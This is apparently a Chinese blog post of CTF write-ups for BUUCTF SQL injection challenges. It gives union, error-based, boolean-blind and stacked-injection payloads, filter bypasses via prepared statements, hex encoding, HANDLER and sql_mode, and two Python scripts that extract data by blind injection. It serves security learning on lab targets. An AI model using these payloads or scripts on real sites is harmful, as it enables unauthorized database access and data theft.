---
title: BUUCTF SQL 刷题
categories:
- Note&Summary
tag:
- CTF
- web
- SQL
date: 2025-03-12 11:58:22
excerpt: CBCTF的简要wp......
index_img: /img/BUU.png
banner_img: /img/BUU.png
---

# BUUCTF SQL 刷题

# sqltest

分析流量包，可以看出是布尔型 SQL 盲注的过程，注入语句不再具体分析，这里复习一下 wireshark 的使用

找到正确时的响应包

![](/img/BUUCTF_SQL刷题/OusVbMRC4o51aWxF61IcewiPnve.png)

根据内容长度筛选

![](/img/BUUCTF_SQL刷题/FrLJbUgCso9fGvxBcohcsnazn8g.png)

![](/img/BUUCTF_SQL刷题/JGMbbFkWkopOCgxmVEwcUQB2nVf.png)

响应包中可以看到请求的 url

![](/img/BUUCTF_SQL刷题/J6zFbtwv7oEN8WxiaR0ce5tZnub.png)

导出所有符合要求的响应包内容

![](/img/BUUCTF_SQL刷题/NTDAbbVUbohPwuxFl4Vc8FEmnLe.png)

写一个脚本正则匹配提取信息并输出 flag

```
import re
f=open("sql.txt","r")
flag = ["" for i in range(100)]
for l in f.readlines():
    num = re.search(r"limit%200,1\)\),%20(\d+),%201\)\)",l)
    part = re.search(r",%201\)\)>(\d+)]",l)
    if num and part:
        flag[int(num.group(1))] = chr(int(part.group(1)) + 1)
print("flag:")
for f in flag:
    print(f,end="")
```

# BUU SQL COURSE

登录未能注入成功，浏览器观察网络模块发现新闻点击时可能存在注入，所以复制 url 开始尝试

![](/img/BUUCTF_SQL刷题/I4WhbD5rpoJ0qNx7zlJceNGhnme.png)

`?id=1 and 1=1` 时仍是相同回显

`?id=1 and 1=2` 时无回显，说明为数字型

`?id=1 order by 2` 有正常回显，`?id=1 order by 3` 无，说明为 2 列

`?id=-1 union select database(),group_concat(table_name) from information_schema.tables where table_schema='news'` 即可得到数据库名、表名

![](/img/BUUCTF_SQL刷题/IXUnb4AFSoT7jhxE2Wucs5UQnJe.png)

后续依次获取列名、内容即可

# [极客大挑战 2019]EasySQL

尝试判断闭合类型，结尾使用注释

![](/img/BUUCTF_SQL刷题/WUQZbgFmrombgMxEdN2cbOhHnof.png)

在密码 123 处报错，说明密码的闭合方式为双引号且注释未生效，尝试 `1' and 1=1 -- -`

![](/img/BUUCTF_SQL刷题/QAJfbgSDFoVJ42x3kbucknkVnTb.png)

未出现如上报错，注释成功，未出现其他报错，闭合方式正确，输入 `1' order by 5 -- -` 逐一尝试

![](/img/BUUCTF_SQL刷题/FNAebYobGomIfrxSZdgcFa6Tnuf.png)

`1' order by 4 -- -` 时报错，`1' order by 3 -- -` 未报错，说明 3 列

![](/img/BUUCTF_SQL刷题/EzxjbooRXoIJgJxb4Ldcs7hgnb1.png)

输入 `1' union select 1,2,3 -- -` 判断显示位置，直接结束。

![](/img/BUUCTF_SQL刷题/JgCrb5IWGoabbixlF4LcIA3Fn5m.png)

**其实直接** `1' or 1=1 #` **完事......**

# [GXYCTF2019]BabySQli

输入 `1' and 1=1 -- -`，显示 do not hack me 发现有过滤，多试几个就发现 and、or、=均有过滤，尝试大小写成功绕过。

输入 `1' Order By 3 -- -` 无报错，`1' Order By 4 -- -` 报错，说明共三列

输入 `1' union select 1,2,3 -- -` 仍为 wrong user，没发现回显位置

![](/img/BUUCTF_SQL刷题/AFKxbgFwNo9rcdxYw7kcvwynnAf.png)

但是发现注释如下（原本就有之前没看到），base32+base64 解密可得明文

`select * from user where username = '$name'`

那么逻辑应该就是先根据用户名查找，然后再校验密码。

用户名直接输入 admin，存在该用户，返回 wrong pass

已知一个用户名后用 union select 去探测一下用户名所在列，输入 `1' union select 'admin',2,3 -- -` 返回 wrong user，输入 `1' union select 1,'admin',3 -- -` 返回 wrong pass，说明用户名位于第二列，可以推测密码即第三列。

但是后面就不知道怎么搞了，只能去看源码，输入的密码 md5 加密后要与数据库第三列数据一致才能获得 flag。

![](/img/BUUCTF_SQL刷题/QZ0AbwarKoF7Plx2DRxcfaYknHh.png)

网上搜索了一下，发现 union 联合查询时如果查询的数据不存在，就会构建一个虚拟的数据，可能这也是为什么 `1' union select 1,2,3 -- -` 可以探测回显位置，1~3 在表内原本不存在，union 查询后先构造了虚拟的 1~3 的数据，然后再读取返回到有回显的位置。

由于是先查询用户名再判断密码是否正确，所以本题可以利用 union 联合查询在用户名处注入，向密码列写入一个 md5 值，然后在密码处输入 md5 对应的明文，那么在查询完用户名后虚拟数据构造完成，判断密码时就将密码栏输入的内容 md5 加密后与虚拟数据的密码列内容比较，也就绕过了原本的密码。

```
例如：                                  （123 md5后的结果）
用户：1' union select 1,'admin','202cb962ac59075b964b07152d234b70' -- -
密码：123
```

# [极客大挑战 2019]HardSQL

逐个尝试发现 and、=、>、<、空格、union 均被过滤，双写及大小写均无法绕过，但是存在报错信息，考虑报错注入。

输入 `1'"` 报错，`use near '"' and password='123'' at line 1`，所以单引号闭合

![](/img/BUUCTF_SQL刷题/X4Tfb1kbboP7d7xO2FZcfjDrnLb.png)

输入 `1'` 报错，输入 `1'#` 不报错，`#` 成功注释

![](/img/BUUCTF_SQL刷题/AJEFbUNbXoXesOx2ykQcF5q9npe.png)

因为空格被过滤，括号正常，所以可以套括号代替空格。`extractvalue()` 函数去触发报错，`concat()` 拼接一下内容。输入 `1'or(extractvalue(1,concat(0x7e,database())))#`，成功得到数据库名。

![](/img/BUUCTF_SQL刷题/UwYLbR2kooz1FJx4PMlcDWb8nIh.png)

这里注意整个 select 语句外面也要套一层括号，用 `like` 代替 `=` 继续输入 `1'or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')))))#`，获得表名。

![](/img/BUUCTF_SQL刷题/QPlhbUB0totaT5xuGQWcgb42nDh.png)

稍作修改，继续输入 `1'or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')))))#`，获得列名。

![](/img/BUUCTF_SQL刷题/Be9PbyEnAoovDnxikzQcsfb0nBc.png)

稍作修改，继续输入 `1'or(extractvalue(1,concat(0x7e,(select(group_concat(username,0x7e,password))from(geek.H4rDsq1)))))#`，获得 username 和 password 列的内容。

![](/img/BUUCTF_SQL刷题/Em56bWLD5oa4vxxfiFfcoaiinzx.png)

显示不完全，用 `substring(str,num1,num2)` 函数调整位置，结果发现这个也过滤了，换用 `right` 尝试 `1'or(extractvalue(1,concat(0x7e,right((select(group_concat(username,0x7e,password))from(geek.H4rDsq1)),30))))#`，成功，拼接即得 flag。

![](/img/BUUCTF_SQL刷题/UfYgb6VlWo2S67xoN8GctLwqn2g.png)

# [极客大挑战 2019]FinalSQL

登录栏测了一下基本都过滤了，选择正确代码发现存在注入，但是 union、and、空格这些过滤了大部分，而且没有回显位，应该就是考布尔盲注。用 python 脚本二分法去跑结果

```
import requests
import re
import time

url = "http://df6d4f70-e3c4-46b8-86fb-7d59ae29eb14.node5.buuoj.cn:81/search.php?id="
x = 7
payloads = [
    # 库长 0
    "",
    # 库名 1
    "1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),{i},1))>{mid})",
    # 表长 2
    "",
    # 表名 3
    "1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),{i},1))>{mid})",
    # 列长 4
    "",
    # 列名 5
    "1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='F1naI1y'),{i},1))>{mid})",

    "",
    # 内容 7
    "1^(ascii(substr((select(group_concat(password))from(geek.F1naI1y)),{i},1))>{mid})"
]

method=0

keywords = "ERROR"#"Click others"

def boolean_query(url,payload):
    if method == 0:
        r = requests.get(url + payload)
    elif method == 1:
        r = requests.post(url, payload)
    elif method == 2:
        r = requests.post(url, json=payload)
    return keywords in r.text  # 这里判断页面是否存在关键字

def get_length(url,payload):
    if payload == "":
        return 0
    for i in range(1, 200):
        if boolean_query(url,payload):
            return i
    return 0

def get_name(url,length,payload):
    results=[]
    if length == 0:
        length = 400
    name = ""
    for i in range(170,length+1):
        low, high = 32, 126
        while low < high:
            time.sleep(0.1)
            mid = (low + high) // 2
            tmp_payload = payload.format(i=i,mid=mid)
            if boolean_query(url,tmp_payload):
                low = mid + 1
            else:
                high = mid
        if low == 32:  # ASCII 32 = 空格，表示结束
            break
        name += chr(low)
        print(chr(low),end="")
    return name

payload = payloads[x]
length = get_length(url,payload)
result = get_name(url,length,payload)
print(f"\n[+] Found : {result}")
```

先跑所有数据库名

![](/img/BUUCTF_SQL刷题/ZWFubIQemoP1duxlppvcvHzSnrd.png)

然后跑出 geek 库的表名

![](/img/BUUCTF_SQL刷题/Uuffb5xTxo7EsbxoYWfc0iy7nRc.png)

然后跑出 geek 库 Flaaaaag 表的列名

![](/img/BUUCTF_SQL刷题/Udu9bk5OcoclUxxS6BYcWykInmc.png)

然后发现被骗了

![](/img/BUUCTF_SQL刷题/H6aYbClnJoIjYmxPEqUcs7gLnTg.png)

换 F1naI1y 表跑，大概就这样，内容部分有错误。

![](/img/BUUCTF_SQL刷题/WQ3sb0fGRoDaZIxTsctc3Pz0n0K.png)

# [CISCN2019 华北赛区 Day2 Web1]Hack World

输入 1、2 均有结果，空格、+ 被过滤，发现 %20 可替代，and、or、union、information、(group、%20group、均过滤。

综合考虑，可以用 concat()代替 group_concat()，空格沿用前面一题的括号，information 可以改用 sys.schema_auto_increment_columns 查表，但是再一看题目已经给出 flag 所在表和列了，那就直接爆就好了。按我的注入语句来说，当 Hello, glzjin wants a girlfriend.出现的时候即判断正确，Error Occured When Fetch Result.出现即判断错误，其他即注入语句本身有误。

```
import requests
import re
import time

url = "http://23f0fee2-b6ad-4a70-88b9-b13213bde7f9.node5.buuoj.cn:81/index.php"

x = 7
payloads = [
    # 库长 0
    "",
    # 库名 1
    "0^(ascii(substr(database(),{i},1))>{mid})",
    # 表长 2
    "",
    # 表名 3
    "",
    # 列长 4
    "",
    # 列名 5
    "",

    "",
    # 内容 7
    "0^(ascii(substr((select(concat(flag))from(flag)),{i},1))>{mid})"
]

method=1               # get:0  post+url:1  post+json:2
parameters_url={"id":""}        # method=1
target_url="id"                 # method=1
parameters_json={"username":"","password":"1"}      # method=2
target_json="username"                             # method=2

keywords = "glzjin"

def boolean_query(url,payload):
    if method == 0:
        r = requests.get(url + payload)
    elif method == 1:
        parameters_url[target_url] = payload
        r = requests.post(url, data=parameters_url)
    elif method == 2:
        parameters_json[target_json]=payload
        r = requests.post(url, json=parameters_json)
    return keywords in r.text  # 这里判断页面是否存在关键字

def get_length(url,payload):
    if payload == "":
        return 0
    for i in range(1, 200):
        if boolean_query(url,payload):
            return i
    return 0

def get_name(url,length,payload):
    results=[]
    if length == 0:
        length = 400
    name = ""
    for i in range(1,length+1):
        low, high = 32, 126
        while low < high:
            time.sleep(0.1)
            mid = (low + high) // 2
            tmp_payload = payload.format(i=i,mid=mid)
            if boolean_query(url,tmp_payload):
                low = mid + 1
            else:
                high = mid
        if low == 32:  # ASCII 32 = 空格，表示结束
            break
        name += chr(low)
        print(chr(low),end="")
    return name

payload = payloads[x]
length = get_length(url,payload)
result = get_name(url,length,payload)
print(f"\n[+] Found : {result}")
```

一开始先查了数据库，后面发现没必要

![](/img/BUUCTF_SQL刷题/SThibFGh1oDzufxI7Flcvf0hnAe.png)

![](/img/BUUCTF_SQL刷题/GyP3byDCsoSIwIxCzVhc7X5KnTg.png)

# [强网杯 2019]随便注

刚学，先用 BP 和相关字典 fuzz 一下，可以比较高效地探测哪些函数、关键字、符号不可用

例如本题当输入 `select` 时直接给出了过滤的范围，联合注入可以排除

![](/img/BUUCTF_SQL刷题/Lan7bHQDHoQ3ZjxZfkuchz97nbd.png)

输入 `1 or 1=1` 时能正常回显

![](/img/BUUCTF_SQL刷题/T2uWbq5ePoqP3mxBp8OcFk7JnSg.png)

输入 `1' or '1'='1` 时同样正常

![](/img/BUUCTF_SQL刷题/IYEpbtlTPoe8BJxOxUccDGYnnhp.png)

这个时候则会报错

![](/img/BUUCTF_SQL刷题/W9kabh3tTo0Vzqx8uRbconPAn1e.png)

说明后面还有查询语句，以单引号闭合，所以后面还要补上注释符 `1' or 1=1#`，此时显示了所有内容

![](/img/BUUCTF_SQL刷题/H45dbqPdvoQqrqxcB9GcFtednRf.png)

接下来尝试堆叠注入，要避免直接使用 select 和 where，`1';show databases;#` 查看数据库

![](/img/BUUCTF_SQL刷题/A7nFbsJaroJVDDxMSlkcrG6anXr.png)

继续查看表 `1';show tables;#`

![](/img/BUUCTF_SQL刷题/HScpbJe1SofO5vxYmuvcMersn0d.png)

接下来查看列可以使用 `1'; show columns from tableName;#` 或 `1';desc tableName;#`。注意，<u>如果 tableName 是纯数字，需要用反引号</u>```<u>包裹</u>，所以输入 `1';desc ` 1919810931114514 `;#`

![](/img/BUUCTF_SQL刷题/EdW7blyC1oBOcGxwqCkcWCQrntg.png)

得到列名后想要获取具体内容一般都需要依靠 select 和 where，这里参考别人总结的四种方法学习尝试一下

## 方法一：预编译 + 字符串拼接绕过

通过预编译的方式拼接 select 关键字：`1';PREPARE hacker from concat('s','elect', ' * from ` 1919810931114514 ` ');EXECUTE hacker;#`。预编译相当于定一个语句相同，参数不同的 Mysql 模板，我们可以通过预编译的方式，绕过特定的字符过滤。之前有学习过通过预编译防御 SQL 注入攻击，但这是第一次用预编译来绕过防护。

预编译的格式如下：

```
PREPARE 名称 FROM Sql语句 ? ;
SET @x=xx;
EXECUTE 名称 USING @x;
```

例如：正常查询使用 `SElECT * FROM t_user WHERE USER_ID = 1`，预编译则可以如下操作

```sql
方法一：
PREPARE jia FROM 'SElECT * FROM t_user WHERE USER_ID = 1';
EXECUTE jia;

方法二：
PREPARE jia FROM 'SELECT * FROM t_user WHERE USER_ID = ?';
SET @ID = 1;
EXECUTE jia USING @ID;

方法三：
SET @SQL='SElECT * FROM t_user WHERE USER_ID = 1';
PREPARE jia FROM @SQL;
EXECUTE jia;
```

本题因为可以堆叠注入且过滤了 select 关键字，所以先将关键字拆开通过 concat 方法拼接并预编译，来绕过检测，然后再执行预编译好的查询语句获取 flag。

![](/img/BUUCTF_SQL刷题/D3TEbhvlPopwvIxQkQ7cVK9gnzN.png)

## 方法二：预编译 + 十六进制编码绕过

可以直接将 `select * from ` 1919810931114514`` 语句进行 16 进制编码，即：`73656c656374202a2066726f6d20603139313938313039333131313435313460`，替换 payload 预编译：

`1';PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#`

基本原理同上

## 方法三：handler 替换 select（仅 MySQL）

`1';HANDLER ` 1919810931114514 `OPEN;HANDLER` 1919810931114514 `READ FIRST;HANDLER` 1919810931114514 ` CLOSE;#` 直接获取 flag

mysql 除可使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过 handler 语句并不具备 select 语句的所有功能，并且是 mysql 专用的语句，并没有包含到 SQL 标准中。

handler 使用格式：

```sql
打开表：
HANDLER 表名 OPEN ;

查看数据：
HANDLER 表名 READ next;

关闭表：
HANDLER 表名 READ CLOSE;
```

本题即先用 handler 打开 `1919810931114514` 表，读取表的第一行数据，然后关闭表

## 方法四：根据原本查询语句的逻辑修改表名和列名（相对取巧）

我们输入 1 后，默认会显示 id 为 1 的数据，可以猜测默认显示的是 words 表的数据，那么只要更改目标表的名称和结构为 words 表、words 表改成其他名称，就可以达到利用原有查询语句直接查询 flag 字段的值的效果

修改表名、添加列的语法格式：

```sql
修改表名：
ALTER TABLE 旧表名 RENAME TO 新表名;

修改字段：
ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型;

添加列：
alter table TABLE_NAME add column NEW_COLUMN_NAME varchar(255) not null first;
```

查看 words 表结构 `1';desc words;#` 总共两个字段 id 和 data，推测应该是输入 id 给出对应 data

![](/img/BUUCTF_SQL刷题/TnErbguBhoNNlgxeylXc356Fnh7.png)

那么我们可以把 words 表随便改成其他名称，然后把目标 1919810931114514 表改成 words，再把列名 flag 改成 data，在最前列添加 id 列即可实现查询

`1'; alter table words rename to words1;alter table ` 1919810931114514 `rename to words;alter table words change flag data varchar(50);alter table words add column id int(10) not null first;#`

执行后，先读取了原本 words 表的 id=1 的 data 并返回输出

![](/img/BUUCTF_SQL刷题/H2nHbYVZRoI1r7xBQKZcaohhnRg.png)

输入（id）0 查询，即得 flag

![](/img/BUUCTF_SQL刷题/D8gdb3B62oci4Ix8brjc1Xbon2b.png)

或者参考我所参考的知乎那篇 wp，直接将 flag 重命名为 id，然后 `1' or 1=1#` 查看所有内容

## 参考：

[https://zhuanlan.zhihu.com/p/545713669](https://zhuanlan.zhihu.com/p/545713669)

[https://ek1ng.com/notes.html#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8](https://ek1ng.com/notes.html#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8)

# [SUCTF 2019]EasySQL

还是先用 BP 扫一遍，可以看到许多关键词如 and、from、information 被过滤，联合注入、报错注入基本排除

![](/img/BUUCTF_SQL刷题/T6Trb69KpoBDWDx9kDmcnkqEnsc.png)

综合考虑先尝试堆叠注入，输入 `1;show databases;#`，成功获取数据库名，说明是数字型无需其他闭合，且堆叠注入可行

![](/img/BUUCTF_SQL刷题/KGXUbk5GooGT6Sxv8ypcLW5xnoh.png)

继续输入 `1;show tables;#`，发现 Flag 表

![](/img/BUUCTF_SQL刷题/HaLqbQoEcoXOvSxR864cGDk3nth.png)

尝试 handler 读取 `1;handler Flag open;handler Flag read first;handler Flag close;#`，结果发现 Flag 被过滤，因为 handler 和 from 被过滤，也无法使用前一题的预编译绕过，其他各种绕过方法试了一遍，过长时也会拦截，最后只能借鉴网上的 WP。

这道题需要推测查询语句的大致结构，这里的 sql 语句为 `select $post['query']||flag from Flag`，表现出来的特征是输入非零时有回显，输入 0 或其他字符时均无回显或是报错，做题时需要根据这个特征推测才能继续做下去。

## 方法一：修改 sql_mode

修改 MySQL 服务的环境变量 sql_mode，用于设置 MySQL 支持的语法和数据校验模式。本题将 sql_mode 设为 `pipes_as_concat`，作用是将 || 的作用由 or 变为拼接字符串。

所以输入 `1;set sql_mode=PIPES_AS_CONCAT;select 1` 时原有的查询语句就会将 `select 1` 和 `select flag from Flag` 的结果拼接在一起返回。

![](/img/BUUCTF_SQL刷题/F3LUbtmpFomIgYxYKTscUwpSnZd.png)

```
附加几种常见的sql_mode值的介绍：

几种常见的mode介绍
ONLY_FULL_GROUP_BY：出现在select语句、HAVING条件和ORDER BY语句中的列，必须是GROUP BY的列或者依赖于GROUP BY列的函数列。

NO_AUTO_VALUE_ON_ZERO：该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。如果用户希望插入的值为0，而该列又是自增长的，那么这个选项就有用了。

STRICT_TRANS_TABLES：在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制

NO_ZERO_IN_DATE：这个模式影响了是否允许日期中的月份和日包含0。如果开启此模式，2016-01-00是不允许的，但是0000-02-01是允许的。它实际的行为受到 strict mode是否开启的影响1。

NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期。它实际的行为受到 strictmode是否开启的影响2。

ERROR_FOR_DIVISION_BY_ZERO：在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL

NO_AUTO_CREATE_USER：禁止GRANT创建密码为空的用户

NO_ENGINE_SUBSTITUTION：如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常

PIPES_AS_CONCAT：将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似

ANSI_QUOTES：启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符
```

## 方法二：满足 || 的条件

如果 `$post[‘query’]` 的数据为 `*,1`，sql 语句就变成了 `select *,1||flag from Flag`，也就是 `select *,1 from Flag`，可以直接查询出 Flag 表中的所有内容。输入 `1;select *,1`

![](/img/BUUCTF_SQL刷题/Zey3bJzAMoqJcIx0tC7c8lErnyc.png)

## 参考：

[https://ek1ng.com/notes.html#SUSCTF2019-EasySQL](https://ek1ng.com/notes.html#SUSCTF2019-EasySQL)

[https://www.cnblogs.com/gtx690/p/13176458.html](https://www.cnblogs.com/gtx690/p/13176458.html)
